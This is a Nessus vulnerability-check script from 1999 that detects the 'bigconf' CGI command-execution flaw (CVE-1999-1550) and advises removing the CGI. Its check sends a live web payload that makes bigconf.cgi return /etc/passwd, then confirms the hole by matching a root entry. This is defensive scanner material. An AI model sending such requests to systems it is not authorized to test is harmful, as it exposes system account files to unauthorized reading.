#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10027);
 script_bugtraq_id(778);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-1999-1550");
 
 name["english"] = "bigconf";
 name["francais"] = "bigconf";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'bigconf' cgi is installed. This CGI has
a well known security flaw that lets anyone execute arbitrary
commands with the privileges of the http daemon (root or nobody).

Solution : remove it from /cgi-bin.

Risk factor : High";


 desc["francais"] = "Le cgi 'bigconf' est install�. Celui-ci poss�de
un probl�me de s�curit� bien connu qui permet � n'importe qui de faire
executer des commandes arbitraires au daemon http, avec les privil�ges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin.

Facteur de risque : S�rieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/bigconf.cgi";
 summary["francais"] = "V�rifie la pr�sence de /cgi-bin/bigconf.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
req = string(dir, "/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=;");
req = http_get(item:req, port:port);
buf = http_keepalive_send_recv(port:port, data:req);
if( buf == NULL ) exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf))security_hole(port);
}
